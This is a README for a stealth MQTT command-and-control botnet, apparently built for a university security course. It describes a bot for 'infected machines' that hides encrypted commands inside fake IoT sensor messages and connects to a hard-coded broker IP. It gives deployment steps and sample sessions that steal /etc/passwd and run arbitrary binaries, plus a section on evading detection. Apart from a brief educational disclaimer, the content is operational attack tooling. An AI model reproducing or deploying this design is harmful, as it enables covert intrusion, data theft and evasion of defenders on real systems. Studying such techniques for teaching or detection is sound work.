# MQTT C&C Botnet - Stealth IoT Communication

A covert Command & Control system disguised as IoT sensor traffic, using MQTT protocol for communication.

## 📋 Overview

This project implements a stealth botnet that communicates over MQTT, disguising malicious traffic as legitimate IoT sensor data. The system consists of two components:

- **Bot** (`bot.py`): Runs on infected machines, disguised as temperature sensors
- **Controller** (`controller.py`): Command interface for managing bots

## 🔒 Stealth Protocol Design

### Disguise Mechanism

All communication is disguised as IoT sensor telemetry to blend with legitimate traffic on the shared "sensors" topic.

**Normal Sensor Message:**
```json
{
  "device_id": "sensor_temp_a1b2c3d4",
  "timestamp": 1234567890,
  "temperature": 23.5,
  "humidity": 65.2,
  "battery": 87,
  "status": "normal"
}
```

**Command Message (Controller → Bot):**
```json
{
  "device_id": "controller_hub_001",
  "timestamp": 1234567890,
  "temperature": 25.0,
  "humidity": 60.0,
  "battery": 95,
  "status": "calibrating",  ← Signal flag
  "checksum": "gAAAAABk..." ← Encrypted command
}
```

**Response Message (Bot → Controller):**
```json
{
  "device_id": "sensor_temp_a1b2c3d4",
  "timestamp": 1234567890,
  "temperature": 23.5,
  "humidity": 65.2,
  "battery": 87,
  "status": "normal",
  "checksum": "gAAAAABk..." ← Encrypted response
}
```

### Encryption

- **Algorithm**: Fernet (symmetric encryption based on AES-128-CBC)
- **Key**: Shared 32-byte key embedded in both bot and controller
- **Purpose**: Encrypts command/response data hidden in the "checksum" field

### Command Encoding

Commands are encrypted and embedded in the `checksum` field. The `status: "calibrating"` flag signals a command message.

**Command Structure (before encryption):**
```json
{
  "cmd": "ls",
  "target": "a1b2c3d4",
  "params": {"dir": "/tmp"}
}
```

### Traffic Characteristics

1. **Mimics IoT Sensors**: Uses realistic sensor field names and values
2. **No Obvious Patterns**: Commands hidden in encrypted blobs
3. **Shared Topic**: Blends with other legitimate sensors on "sensors" topic
4. **Minimal Metadata**: Only encrypted payloads reveal true purpose

## 🚀 Installation

### Prerequisites

- Python 3.7+
- Access to MQTT broker at 147.32.82.209:1883
- Docker (optional, for containerized deployment)

### Install Dependencies

```bash
pip install -r requirements.txt
```

Or manually:
```bash
pip install paho-mqtt==1.6.1 cryptography==41.0.7
```

## 📖 Usage

### Running the Bot (Infected Machine)

```bash
python3 bot.py
```

**Output:**
```
[*] Starting stealth bot a1b2c3d4
[+] Bot a1b2c3d4 connected to broker
```

The bot will:
- Connect to the MQTT broker
- Subscribe to the "sensors" topic
- Send initial "sensor reading" (heartbeat)
- Listen for encrypted commands

### Running the Controller

```bash
python3 controller.py
```

**Interactive Shell:**
```
============================================================
MQTT C&C Controller - Stealth Mode
============================================================

Commands:
  announce [bot_id]     - Announce bot presence
  users [bot_id]        - List logged in users
  ls [bot_id] [dir]     - List directory contents
  whoami [bot_id]       - Get bot user ID
  getfile [bot_id] [path] - Download file
  exec [bot_id] [binary] - Execute binary
  bots                  - List active bots
  help                  - Show this help
  exit                  - Quit controller

Note: Use 'all' as bot_id to target all bots
============================================================

C2>
```

## 🎮 Command Reference

### 1. Announce Bot Presence

Requests bots to identify themselves.

```bash
C2> announce all
[*] Command 'announce' sent to all

============================================================
[+] Response from Bot: a1b2c3d4
============================================================
Bot a1b2c3d4 online
============================================================
```

### 2. List Logged-in Users

Executes `w` command on the target machine.

```bash
C2> users a1b2c3d4
[*] Command 'users' sent to a1b2c3d4

============================================================
[+] Response from Bot: a1b2c3d4
============================================================
 12:34:56 up 5 days,  3:21,  2 users,  load average: 0.15, 0.10, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    192.168.1.100    11:22    0.00s  0.04s  0.00s w
============================================================
```

### 3. List Directory Contents

Executes `ls -la [directory]` on the target.

```bash
C2> ls a1b2c3d4 /tmp
[*] Command 'ls' sent to a1b2c3d4

============================================================
[+] Response from Bot: a1b2c3d4
============================================================
total 48
drwxrwxrwt 10 root root 4096 Jan  7 12:34 .
drwxr-xr-x 20 root root 4096 Dec 15 10:00 ..
-rw-r--r--  1 user user  123 Jan  7 11:00 test.txt
============================================================
```

### 4. Get User ID

Executes `id` command to identify the bot's user context.

```bash
C2> whoami a1b2c3d4
[*] Command 'whoami' sent to a1b2c3d4

============================================================
[+] Response from Bot: a1b2c3d4
============================================================
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),27(sudo)
============================================================
```

### 5. Download File

Retrieves file contents (base64 encoded).

```bash
C2> getfile a1b2c3d4 /etc/passwd
[*] Command 'getfile' sent to a1b2c3d4

============================================================
[+] Response from Bot: a1b2c3d4
============================================================
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDox...
============================================================
```

To decode the file:
```bash
echo "cm9vdDp4OjA..." | base64 -d > downloaded_file
```

### 6. Execute Binary

Runs arbitrary binaries on the infected machine.

```bash
C2> exec a1b2c3d4 /usr/bin/ps aux
[*] Command 'exec' sent to a1b2c3d4

============================================================
[+] Response from Bot: a1b2c3d4
============================================================
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 169416 11632 ?        Ss   Jan01   0:03 /sbin/init
root         2  0.0  0.0      0     0 ?        S    Jan01   0:00 [kthreadd]
...
============================================================
```

### 7. List Active Bots

Shows discovered bots and their last activity.

```bash
C2> bots

[*] Active Bots:
  - a1b2c3d4 (last seen: 12:35:42)
  - e5f6g7h8 (last seen: 12:34:15)
```

## 🐳 Docker Deployment

### Build Container

```bash
docker build -t mqtt-c2 .
```

### Run Bot in Container

```bash
docker run -d --name bot1 mqtt-c2 python3 bot.py
```

### Run Controller in Container

```bash
docker run -it --name controller mqtt-c2 python3 controller.py
```

### Dockerfile

```dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY bot.py controller.py ./

CMD ["python3", "bot.py"]
```

## 🔐 Security Features

1. **Encryption**: All commands and responses encrypted with Fernet
2. **Stealth**: Traffic disguised as IoT sensor data
3. **Target Selection**: Commands can target specific bots or broadcast to all
4. **Unique Bot IDs**: Each bot generates a unique identifier
5. **Minimal Fingerprint**: No obvious C&C patterns in traffic

## 🛡️ Detection Evasion

- **Legitimate Appearance**: Messages look like temperature/humidity sensors
- **Encrypted Payloads**: Commands not readable without decryption key
- **Status Indicators**: "calibrating" status appears as normal sensor behavior
- **Shared Topic**: Traffic mixes with other IoT devices
- **No Keywords**: No obvious "command", "bot", "malware" terms in messages

## ⚠️ Disclaimer

This project is for **educational purposes only** as part of a cybersecurity course (BSY). 
It demonstrates C&C communication techniques and MQTT protocol usage. 

**Do not use this code for malicious purposes.** Unauthorized access to computer systems is illegal.

## 📝 Protocol Specification

### Message Flow

```
1. Bot Startup:
   Bot → Broker: Initial sensor reading (heartbeat)

2. Command Execution:
   Controller → Broker: Command (status="calibrating", encrypted payload)
   Broker → Bot: Command received
   Bot: Decrypts, validates target, executes command
   Bot → Broker: Response (encrypted result in checksum)
   Broker → Controller: Response received
   Controller: Decrypts and displays result

3. Multiple Bots:
   - target="all": All bots execute command
   - target="<bot_id>": Only specific bot executes
```

### Encryption Details

- **Library**: cryptography.fernet
- **Base**: AES-128-CBC with HMAC authentication
- **Key Derivation**: Direct 32-byte key (urlsafe base64)
- **IV**: Automatically handled by Fernet

### Command Codes

| Command | Description | Parameters |
|---------|-------------|------------|
| announce | Bot identification | None |
| users | List logged-in users (`w`) | None |
| ls | List directory | `dir`: path |
| whoami | Get user ID (`id`) | None |
| getfile | Download file | `path`: filepath |
| exec | Execute binary | `bin`: binary path |

## 🧪 Testing

### Test Bot Connection

```bash
# Terminal 1: Start bot
python3 bot.py

# Terminal 2: Start controller
python3 controller.py

# In controller:
C2> announce all
# Should see bot response
```

### Test Commands

```bash
C2> whoami all
C2> ls all /tmp
C2> users all
```

## 📚 Requirements File

`requirements.txt`:
```
paho-mqtt==1.6.1
cryptography==41.0.7
```

## 🤝 Contributors

Built for CTU Prague BSY (Bezpečnost systémů) course.

## 📄 License

Educational use only - CTU Prague 2024-2025
